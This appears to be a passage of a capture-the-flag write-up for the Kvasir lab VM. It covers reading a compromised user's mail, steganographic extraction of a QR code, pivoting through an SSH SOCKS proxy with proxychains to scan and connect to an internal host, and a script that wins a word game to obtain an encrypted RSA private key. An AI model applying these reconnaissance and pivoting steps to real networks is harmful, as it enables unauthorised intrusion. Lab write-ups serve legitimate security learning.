+</span><span class='line'>User-Agent: Heirloom mailx 12.5 6/20/10
+</span><span class='line'>MIME-Version: 1.0
+</span><span class='line'>Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+</span><span class='line'>Content-Transfer-Encoding: 7bit
+</span><span class='line'>Message-Id: &lt;E1XHczw-0000V2-8y@localhost&gt;
+</span><span class='line'>From: celes@localhost
+</span><span class='line'>
+</span><span class='line'>Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The message reveals that Terra has a puzzle on her machine (<strong>192.168.3.50</strong> from <code>/etc/hosts</code> on the <code>db</code> server?). She also mentions <code>kvasir.png</code>, which happens to be in <code>celese</code> home directory:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>celes@dev1:~<span class="nv">$ </span>ls -lah kvasir.png
+</span><span class='line'>-rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lastly, the <code>.bash_history</code> for <code>celese</code> has a entry <code>stepic --help</code>. <code>stepic</code> is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&rsquo;s machine. So, I converted the <code>kvasir.png</code> image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using <code>xxd -r -p kvasir.png.xxd &gt; kvasir.png</code>.</p>
+
+<p><img src="https://i.imgur.com/DKIbriL.png"></p>
+
+<h3>getting stepic to play nice</h3>
+
+<p>With the image ready, I searched for <code>stepic</code> using <code>pip</code> in my virtual env and installed it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# pip install stepic
+</span><span class='line'>Downloading/unpacking stepic
+</span><span class='line'>  Downloading stepic-0.4%7ebzr.tar.gz
+</span><span class='line'>  Running setup.py egg_info <span class="k">for </span>package stepic
+</span><span class='line'>
+</span><span class='line'>Installing collected packages: stepic
+</span><span class='line'>  Running setup.py install <span class="k">for </span>stepic
+</span><span class='line'>    changing mode of build/scripts-2.7/stepic from 644 to 755
+</span><span class='line'>
+</span><span class='line'>    changing mode of /root/kvasir/bin/stepic to 755
+</span><span class='line'>Successfully installed stepic
+</span><span class='line'>Cleaning up...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# stepic
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;/root/kvasir/bin/stepic&quot;</span>, line 24, in &lt;module&gt;
+</span><span class='line'>    import Image
+</span><span class='line'>ImportError: No module named Image
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# pip install pillow
+</span><span class='line'>Downloading/unpacking pillow
+</span><span class='line'>  Downloading Pillow-2.6.1.tar.gz <span class="o">(</span>7.3Mb<span class="o">)</span>: 7.3Mb downloaded
+</span><span class='line'>  Running setup.py egg_info <span class="k">for </span>package pillow
+</span><span class='line'>    Single threaded build, not installing mp_compile: 1 processes
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>    *** OPENJPEG <span class="o">(</span>JPEG2000<span class="o">)</span> support not available
+</span><span class='line'>    --- ZLIB <span class="o">(</span>PNG/ZIP<span class="o">)</span> support available
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Successfully installed pillow
+</span><span class='line'>Cleaning up...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>
+
+<h3>finding the secret</h3>
+
+<p>With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# stepic --decode --image-in<span class="o">=</span>kvasir.png --out<span class="o">=</span>out
+</span><span class='line'>
+</span><span class='line'><span class="c"># check the file type we got out</span>
+</span><span class='line'>root@kali:~# file out
+</span><span class='line'>out: ASCII text, with very long lines, with no line terminators
+</span><span class='line'>
+</span><span class='line'><span class="c"># check the output we got</span>
+</span><span class='line'>root@kali:~# cat out
+</span><span class='line'>89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
+</span><span class='line'>445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
+</span><span class='line'>22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
+</span><span class='line'>559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
+</span><span class='line'>7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
+</span><span class='line'>215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
+</span><span class='line'>55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
+</span><span class='line'>97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
+</span><span class='line'>df9bb4ae0a3dc20000000049454e44ae426082
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>
+
+<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python
+</span><span class='line'>Python 2.7.3 <span class="o">(</span>default, Mar 14 2014, 11:57:14<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>GCC 4.7.2<span class="o">]</span> on linux2
+</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
+</span><span class='line'>&gt;&gt;&gt; <span class="s2">&quot;89504e470d0a1a0a000000&quot;</span>.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>
+</span><span class='line'><span class="s1">&#39;\x89PNG\r\n\x1a\n\x00\x00\x00&#39;</span>
+</span><span class='line'>&gt;&gt;&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# xxd -p -r out &gt; kvasir2.png
+</span><span class='line'>root@kali:~# file kvasir2.png
+</span><span class='line'>kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Lets see what the image looks like:</p>
+
+<p><img src="http://i.imgur.com/r0wxCYh.png"></p>
+
+<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>
+
+<h2>playing Terra&rsquo;s game</h2>
+
+<p>Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
+</span><span class='line'><span class="c"># socks5    127.0.0.1 8000</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># scans will appear to be coming from 192.168.3.200 for</span>
+</span><span class='line'><span class="c"># 192.168.3.50</span>
+</span><span class='line'>root@kali:~# proxychains nmap -sT 192.168.3.50
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 16:31 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.3.50
+</span><span class='line'>Host is up <span class="o">(</span>0.0012s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 998 closed ports
+</span><span class='line'>PORT     STATE SERVICE
+</span><span class='line'>22/tcp   open  ssh
+</span><span class='line'>4444/tcp open  krb524
+</span><span class='line'>
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.47 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc 192.168.3.50 4444
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>Hello Celes <span class="p">&amp;</span> Welcome to the Jumble!
+</span><span class='line'>
+</span><span class='line'>Solve:indrssoses
+</span><span class='line'>Solve:roneb bob
+</span><span class='line'>Solve:abaerrbs
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Solve:iepasncm
+</span><span class='line'>
+</span><span class='line'>Score: 0
+</span><span class='line'>Time: 22.71 secs
+</span><span class='line'>Just a bit embarrasing really...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Kvasir Terra Puzzle Solver</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># read the words.txt we got into a list</span>
+</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;words.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">words</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># connection to the game</span>
+</span><span class='line'><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;192.168.3.50&#39;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start processing the lines</span>
+</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># receive a frame large enough</span>
+</span><span class='line'>    <span class="n">frame</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">150</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># check that its a question frame</span>
+</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Solve&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">frame</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] &#39;Solve&#39; not in frame. Game over?&quot;</span>
+</span><span class='line'>        <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># split the frame with :</span>
+</span><span class='line'>    <span class="n">frame</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Was unable to split by :. Game over?&quot;</span>
+</span><span class='line'>        <span class="k">break</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">question</span> <span class="o">=</span> <span class="n">frame</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># @barrebas suggested a length check too to increase probability :)</span>
+</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">words</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">s</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="n">question</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">question</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span>
+</span><span class='line'>    <span class="c">#result = [s for s in words if not s.strip(question)]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Was unable to match anything to </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">question</span>
+</span><span class='line'>        <span class="k">continue</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Matched </span><span class="si">%s</span><span class="s"> to </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">question</span><span class="p">,</span> <span class="n">answer</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># did we win? \:D/</span>
+</span><span class='line'><span class="k">if</span> <span class="s">&#39;You</span><span class="se">\&#39;</span><span class="s">re a winner&#39;</span> <span class="ow">in</span> <span class="n">frame</span><span class="p">:</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] We won!&quot;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># read the rest of the socket output</span>
+</span><span class='line'>    <span class="n">frame</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2500</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># base64 decode the last string</span>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Extracing and decoding the base64 section&quot;</span>
+</span><span class='line'>    <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">close</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># work with what we have left</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Last frame was:</span><span class="se">\n</span><span class="s"> </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">frame</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
+</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>
+
+<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./play.py
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched atravdeii to radiative
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched oilyaerbdmpn to imponderably
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched idmlhkeir to kriemhild
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> <span class="s1">&#39;Solve&#39;</span> not in frame. Game over?
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We won!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Extracing and decoding the base64 section
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>Proc-Type: 4,ENCRYPTED
+</span><span class='line'>DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
+</span><span class='line'>
+</span><span class='line'>OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
+</span><span class='line'>So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
+</span><span class='line'>Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
+</span><span class='line'>J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
+</span><span class='line'>P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
+</span><span class='line'>jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
+</span><span class='line'>9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
+</span><span class='line'>hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
+</span><span class='line'>Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
+</span><span class='line'>oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
+</span><span class='line'>0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
+</span><span class='line'>q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
+</span><span class='line'>cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
+</span><span class='line'>X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
+</span><span class='line'>MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
+</span><span class='line'>gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
+</span><span class='line'>N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
+</span><span class='line'>izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
+</span><span class='line'>Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
+</span><span class='line'>uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
+</span><span class='line'>PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
+</span><span class='line'>RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
+</span><span class='line'>4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
+</span><span class='line'>DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
+</span><span class='line'>JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
+</span><span class='line'>-----END RSA PRIVATE KEY-----
